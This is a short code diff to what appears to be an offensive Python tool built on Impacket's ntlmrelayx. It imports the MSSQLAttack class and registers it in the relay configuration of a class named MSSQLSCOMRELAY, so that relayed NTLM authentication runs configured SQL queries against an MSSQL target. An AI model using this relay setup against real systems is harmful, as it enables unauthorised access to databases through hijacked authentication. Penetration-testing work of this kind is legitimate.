@@ -2,6 +2,7 @@ import time
 from threading import Lock
 
 from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
+from impacket.examples.ntlmrelayx.attacks.mssqlattack import MSSQLAttack
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
@@ -151,6 +152,10 @@ class MSSQLSCOMRELAY:
         # config.queries must be a LIST of queries, not a dict!
         config.queries = [self.query]
         logger.info(f"[DEBUG] Set query in config.queries: {config.queries}")
+        
+        # Register Impacket's built-in MSSQL attack class
+        config.setAttacks({"MSSQL": MSSQLAttack})
+        logger.info("[DEBUG] Registered MSSQLAttack class")
         
         config.setListeningPort(port)
         config.setInterfaceIp(interface)
